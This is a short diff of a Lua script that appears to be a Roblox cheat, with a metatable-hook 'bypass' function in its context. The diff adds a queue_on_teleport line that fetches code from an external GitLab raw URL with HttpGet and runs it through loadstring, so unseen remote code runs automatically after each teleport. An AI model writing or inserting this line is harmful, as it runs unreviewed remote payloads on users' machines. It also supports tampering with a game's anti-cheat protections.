@@ -32,6 +32,8 @@ local function bypass(h)
     setreadonly(mt, true)
 end
 
+queue_on_teleport([[ loadstring(game:HttpGet("https://gitlab.com/sanctuaryangels/tevez/-/raw/main/tevez"))() ]])
+
 -- serviços e variaveis
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
